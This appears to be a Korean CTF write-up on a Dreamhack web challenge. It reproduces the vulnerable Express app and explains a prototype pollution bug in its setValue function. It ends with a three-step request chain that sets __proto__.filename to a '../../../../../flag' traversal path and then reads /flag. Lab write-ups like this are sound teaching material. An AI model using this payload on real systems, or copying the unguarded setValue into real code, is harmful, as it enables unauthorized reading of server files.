---
layout: single
title: "[Dreamhack] filestorage write-up"
date: 2025-09-02 20:05 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] filestorage

### 😁 문제 설명

- 파일을 관리할 수 있는 구현이 덜 된 홈페이지입니다.

<br>

### ✏️ 풀이

```javascript
var file={};
var read={};
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}
function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}

app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine','ejs');


app.get('/',function(req,resp){
	read['filename']='fake';
	resp.render(__dirname+"/ejs/index.ejs");

})

app.post('/mkfile',function(req,resp){
	let {filename,content}=req.body;
	filename=hash(filename).toString();
	fs.writeFile(__dirname+"/storage/"+filename,content,function(err){
		if(err==null){
			file[filename]=filename;
			resp.send('your file name is '+filename);
		}else{
			resp.write("<script>alert('error')</script>");
			resp.write("<script>window.location='/'</script>");
		}
	})

})

app.get('/readfile',function(req,resp){
	let filename=file[req.query.filename];
	if(filename==null){
		fs.readFile(__dirname+'/storage/'+read['filename'],'UTF-8',function(err,data){
			resp.send(data);
		})
	}else{
		read[filename]=filename.replaceAll('.','');
		fs.readFile(__dirname+'/storage/'+read[filename],'UTF-8',function(err,data){
			if(err==null){
				resp.send(data);
			}else{
				resp.send('file is not existed');
			}
		})
	}

})

app.get('/test',function(req,resp){
	let {func,filename,rename}=req.query;
	if(func==null){
		resp.send("this page hasn't been made yet");
	}else if(func=='rename'){
		setValue(file,filename,rename)
		resp.send('rename');
	}else if(func=='reset'){
		read={};
		resp.send("file reset");
	}
})


app.listen(8000);
```

<br>

문제에 접속하면 아래와 같이 파일 이름과 파일 내용을 입력할 수 있는 폼이 존재한다.

![image-20250902213449908](/images/2025-09-02-filestorage/image-20250902213449908.png)

<br>

아래 전송되는 소스코드를 보면 filename이 hash 함수를 거쳐 /readfile 경로에서 filename 파라미터를 통해 읽어올 수 있는 것을 알 수 있다.

```javascript
app.post('/mkfile',function(req,resp){
	let {filename,content}=req.body;
	filename=hash(filename).toString();
	fs.writeFile(__dirname+"/storage/"+filename,content,function(err){
		if(err==null){
			file[filename]=filename;
			resp.send('your file name is '+filename);
		}else{
			resp.write("<script>alert('error')</script>");
			resp.write("<script>window.location='/'</script>");
		}
	})

})

app.get('/readfile',function(req,resp){
	let filename=file[req.query.filename];
	if(filename==null){
		fs.readFile(__dirname+'/storage/'+read['filename'],'UTF-8',function(err,data){
			resp.send(data);
		})
	}else{
		read[filename]=filename.replaceAll('.','');
		fs.readFile(__dirname+'/storage/'+read[filename],'UTF-8',function(err,data){
			if(err==null){
				resp.send(data);
			}else{
				resp.send('file is not existed');
			}
		})
	}

})
```

<br>

아래처럼 xss 페이로드를 넣어 테스트 해보면 Stored XSS 취약점이 존재한다는 것도 알 수 있다. 하지만 이 문제는 prototype pollution 취약점이 존재한다.

![image-20250902213644699](/images/2025-09-02-filestorage/image-20250902213644699.png)

![image-20250902213700847](/images/2025-09-02-filestorage/image-20250902213700847.png)

![image-20250902213738343](/images/2025-09-02-filestorage/image-20250902213738343.png)

<br>

아래 setValue 함수를 살펴보면 prototype pollution 취약점이 존재한다. key 인자에 `__proto__`, `prototype`, `constructor`같은 값을 넣을 수 있다.

```javascript 
function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}
```

<br>

/test 경로에서는 `setValue` 함수를 사용하는 곳이 func 파라미터가 rename일 때 setValue를 사용한다. 따라서 `/test?func=rename&filename=__proto__.filename&rename=../../../../../flag`로 요청해주면 rename 응답이 오는 것을 알 수 있다. 

```javascript
app.get('/test',function(req,resp){
	let {func,filename,rename}=req.query;
	if(func==null){
		resp.send("this page hasn't been made yet");
	}else if(func=='rename'){
		setValue(file,filename,rename)
		resp.send('rename');
	}else if(func=='reset'){
		read={};
		resp.send("file reset");
	}
})
```

<br>

아래 dockerfile을 보면 flag 임의값이 /flag에 저장되어 있는데 /readfile에 filename 파라미터값을 주지 않으면 BISC{fake flag} 값이 나온다. 또한 아래 readfile[filename]이라는 값이 두 번째 분기로 가면 `.`을 삭제하고 있기 때문에 /readfile 경로에서 파라미터값을 주면 안된다는 것을 알 수 있다.

```dockerfile
RUN echo 'BISC{fake flag}' > /flag
```

```javascript
app.get('/readfile',function(req,resp){
	let filename=file[req.query.filename];
	if(filename==null){
		fs.readFile(__dirname+'/storage/'+read['filename'],'UTF-8',function(err,data){
			resp.send(data);
		})
	}else{
		read[filename]=filename.replaceAll('.','');
		fs.readFile(__dirname+'/storage/'+read[filename],'UTF-8',function(err,data){
			if(err==null){
				resp.send(data);
			}else{
				resp.send('file is not existed');
			}
		})
	}

})
```

<br>

따라서 익스플로잇 하는 과정은 아래와 같다. reset 값을 통해 fake 값을 지워주고, /flag 값을 읽어야 /readfile 경로에 들어가서 flag 값을 읽을 수 있기 때문이다.

```test
1. /test?func=rename&filename=__proto__.filename&rename=../../../../../flag

2. /test?func=reset

3. /readfile
```

